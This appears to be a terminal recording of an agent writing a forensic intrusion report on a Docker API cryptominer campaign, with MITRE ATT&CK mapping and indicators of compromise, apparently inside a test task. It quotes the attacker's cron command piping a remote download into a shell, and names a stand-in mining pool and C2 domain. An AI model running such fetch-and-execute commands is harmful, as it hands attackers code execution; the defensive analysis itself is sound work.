[148.983692, "i", "cat << 'EOF' > /app/intrusion-report.md\n# Intrusion Analysis Report — Docker API Miner Campaign\n\n## Executive Summary\nAn external threat actor compromised host `docker-prod-01` by abusing an unauthenticated Docker Engine API exposed on port 2375 (`/disk/etc/docker/daemon.json:19`). The attacker deployed a privileged container to escape to the underlying host filesystem (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh`), installed a Monero cryptominer (`/disk/opt/xmrig/xmrig:1`), and configured dual persistence mechanisms via cron (`/disk/etc/cron.d/docker-mon:1`) and a silent systemd service (`/disk/etc/systemd/system/docker-metrics.service:1`). EDR alerts captured only a subset of the incident (`/sas/alerts.json`); silent persistence and artifact wiping were uncovered during disk forensics.\n\n## Attack Chain Mapping (MITRE ATT&CK Enterprise)\n\n### Step 1: Initial Access & Persistence — External Remote Services (T1133)\n- **Technique**: T1133 — External Remote Services\n- **Details**: The host configured Docker Engine API to listen on all interfaces (`0.0.0.0:2375`) without TLS authentication (`/disk/etc/docker/daemon.json:19`, `/sas/baseline.json:1`). This exposed control interface allowed unauthenticated network access from external IP `198.51.100.102` (`/disk/var/log/nginx/access.log:1`, `/sas/cti/advisory.txt:10`).\n\n### Step 2: Execution — Deploy Container (T1610)\n- **Technique**: T1610 — Deploy Container\n- **Details**: The attacker issued remote Docker API requests to deploy an ephemeral, privileged container mounting the host's root filesystem (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh`).\n\n### Step 3: Privilege Escalation — Escape to Host (T1611)\n- **Technique**: T1611 — Escape to Host\n- **Details**: Through the mounted host filesystem volume and container entrypoint script (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh`), the attacker executed host-level commands to drop payloads and persistence scripts directly onto `/disk`.\n\n### Step 4: Impact — Resource Hijacking (T1496)\n- **Technique**: T1496 — Resource Hijacking\n- **Details**: The attacker dropped an XMRig cryptominer binary to `/opt/xmrig/xmrig` (`/disk/opt/xmrig/xmrig:1`, `/sas/alerts.json`). The process ran with PID 1337 (`/disk/opt/xmrig/xmrig:1`), causing sustained high CPU consumption while mining to pool `stratum+tcp://xmr.docker.evil:3333` using wallet `4A0000000000000000009e202e3a533f` (`/disk/opt/xmrig/xmrig:1`, `/sas/cti/advisory.txt:16`).\n\n### Step 5: Persistence & Execution — Cron (T1053.003)\n- **Technique**: T1053.003 — Cron\n- **Details**: A cron job was installed at `/etc/cron.d/docker-mon` (`/disk/etc/cron.d/docker-mon:1`, `/sas/alerts.json`). It periodically fetched secondary payloads via `curl hxxp://198.51.100.102/x | sh` (`/disk/etc/cron.d/docker-mon:1`).\n\n### Step 6: Persistence — Systemd Service (T1543.002) [SILENT / UNALERTED]\n- **Technique**: T1543.002 — Systemd Service\n- **Details**: The attacker installed a silent systemd unit named `docker-metrics.service` disguised as \"System Update Helper\" at `/etc/systemd/system/docker-metrics.service` (`/disk/etc/systemd/system/docker-metrics.service:1`). This service was NOT flagged by security alerts (`/sas/alerts.json`) and runs payload re-droppers upon reboot.\n\n### Defense Evasion / Anti-Forensics\n- **Details**: The attacker attempted to wipe artifact cache files (`/disk/var/lib/.cache/.wiped.bin:1`), which partially retained C2 domain references (`update-docker.example.cn`).\n\n## Indicators of Compromise (IOCs) & Key Threat Entities\n- **Source IP**: `198.51.100.102` (`/disk/var/log/nginx/access.log:1`, `/sas/cti/advisory.txt:10`)\n- **C2 Domain**: `update-docker.example.cn` (`/disk/var/lib/.cache/.wiped.bin:1`, `/sas/cti/advisory.txt:15`)\n- **Mining Pool**: `stratum+tcp://xmr.docker.evil:3333` (`/disk/opt/xmrig/xmrig:1`, `/sas/cti/advisory.txt:16`)\n- **Wallet Address**: `4A0000000000000000009e202e3a533f` (`/disk/opt/xmrig/xmrig:1`, `/sas/cti/advisory.txt:17`)\n- **Miner Binary Path**: `/opt/xmrig/xmrig` (`/disk/opt/xmrig/xmrig:1`,"]
[148.983732, "i", " `/sas/alerts.json`)\n- **Cron Persistence Path**: `/etc/cron.d/docker-mon` (`/disk/etc/cron.d/docker-mon:1`, `/sas/alerts.json`)\n- **Systemd Persistence Path**: `/etc/systemd/system/docker-metrics.service` (`/disk/etc/systemd/system/docker-metrics.service:1`)\n- **Container Entrypoint Residue**: `/var/lib/docker/overlay2/attacker/diff/entrypoint.sh` (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh:1`)\nEOF\n"]
[148.985701, "o", "cat << 'EOF' > /app/intrusion-report.md\r\n\u001b[?2004l\r\u001b[?2004h> # Intrusion Analysis Report — Docker API Miner Campaign\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Executive Summary\r\n\u001b[?2004l\r\u001b[?2004h> An external threat actor compromised host `docker-prod-01` by abusing an unauthenticated Docker Engine API exposed on port 2375 (`/disk/etc/docker/daemon.json:19`). The attacker deployed a privileged container to escape to the underlying host filesystem (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh`), installed a Monero cryptominer (`/disk/opt/xmrig/xmrig:1`), and configured dual persistence mechanisms via cron (`/disk/etc/cron.d/docker-mon:1`) and a silent systemd service (`/disk/etc/systemd/system/docker-metrics.service:1`). EDR alerts captured only a subset of the incident (`/sas/alerts.json`); silent persistence and artifact wiping were uncovered during disk forensics.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Attack Chain Mapping (MITRE ATT&CK Enterprise)\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 1: Initial Access & Persistence — External Remote Services (T1133)\r\n\u001b[?2004l\r\u001b[?2004h> - **Technique**: T1133 — External Remote Services\r\n\u001b[?2004l\r\u001b[?2004h> - **Details**: The host configured Docker Engine API to listen on all interfaces (`0.0.0.0:2375`) without TLS authentication (`/disk/etc/docker/daemon.json:19`, `/sas/baseline.json:1`). This exposed control interface allowed unauthenticated network access from external IP `198.51.100.102` (`/disk/var/log/nginx/access.log:1`, `/sas/cti/advisory.txt:10`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 2: Execution — Deploy Container (T1610)\r\n\u001b[?2004l\r\u001b[?2004h> "]
